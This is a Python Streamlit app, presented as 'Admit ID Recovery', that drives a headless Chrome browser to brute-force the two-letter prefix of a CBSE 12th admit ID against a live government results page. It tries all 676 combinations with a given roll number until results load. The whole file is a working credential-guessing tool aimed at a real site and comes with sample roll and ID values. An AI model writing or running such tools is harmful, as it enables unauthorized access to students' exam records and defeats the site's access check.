import streamlit as st
import os
import time
import string
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

# ========================= CONFIGURATION =========================
URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

def get_driver():
    """Sets up a lean, headless Chrome instance for Render."""
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1280,720")
    options.add_argument("--blink-settings=imagesEnabled=false")
    
    render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
    if os.path.exists(render_bin):
        options.binary_location = render_bin
        
    return webdriver.Chrome(options=options)

def is_success(driver):
    """Checks for success indicators or the absence of specific error text."""
    try:
        # Check for the specific 'No data found' error
        try:
            error_elem = driver.find_element(By.ID, "err_msg")
            if error_elem.is_displayed() and "no data found" in error_elem.text.lower():
                return False
        except NoSuchElementException:
            pass 
        
        # Success indicators
        success_indicators = ["marks", "result", "subject", "grade", "total"]
        page_text = driver.page_source.lower()
        if any(ind in page_text for ind in success_indicators):
            return True
            
        if "result" in driver.current_url.lower() and "error" not in driver.current_url.lower():
            return True
            
    except Exception:
        pass
    return False

# ========================= STREAMLIT UI =========================
st.set_page_config(page_title="Admit ID Recovery", page_icon="🎓", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #f5f7f9; }
    .stButton>button { width: 100%; border-radius: 5px; height: 3em; background-color: #ff4b4b; color: white; }
    </style>
    """, unsafe_allow_html=True)

st.title("🎓 CBSE 12th Admit ID Recovery")

col1, col2 = st.columns(2)
with col1:
    roll_val = st.text_input("Roll Number", value="18615899")
with col2:
    suffix_val = st.text_input("Last 6 Characters", value="994511")

delay_val = st.slider("Delay after submit (Seconds)", 0.5, 3.0, 1.0)

if st.button("🚀 Start Brute Force"):
    progress_bar = st.progress(0)
    
    driver = None
    try:
        driver = get_driver()
        letters = string.ascii_uppercase
        combos = [f"{a}{b}" for a in letters for b in letters]
        total = len(combos)
        
        with st.status("Running...", expanded=True) as status:
            for i, prefix in enumerate(combos):
                code = f"{prefix}{suffix_val}"
                status.update(label=f"Testing: **{code}** ({i+1}/{total})")
                progress_bar.progress((i + 1) / total)
                
                # 1. Open/Refresh the page every single time
                driver.get(URL)
                time.sleep(0.5) # Small buffer for page load
                
                try:
                    # 2. Fill and Submit
                    driver.find_element(By.ID, "rroll").send_keys(roll_val)
                    driver.find_element(By.ID, "admn_id").send_keys(code)
                    driver.find_element(By.ID, "submit").click()
                    
                    # 3. Wait for the site to process
                    time.sleep(delay_val)
                    
                    # 4. Check for success
                    if is_success(driver):
                        status.update(label="✅ Match Found!", state="complete")
                        st.balloons()
                        st.success(f"### 🎉 Success!\n**Full Code:** `{code}`")
                        st.code(code, language="text")
                        break
                    
                    # 5. If it hits this point, the loop continues 
                    # and driver.get(URL) will restart the page automatically.
                        
                except Exception as e:
                    # If an element isn't found, just skip to the next refresh
                    continue 
            else:
                status.update(label="❌ Search Exhausted", state="error")
                st.warning("Finished all combinations.")

    except Exception as e:
        st.error(f"System Error: {e}")
    finally:
        if driver:
            driver.quit()
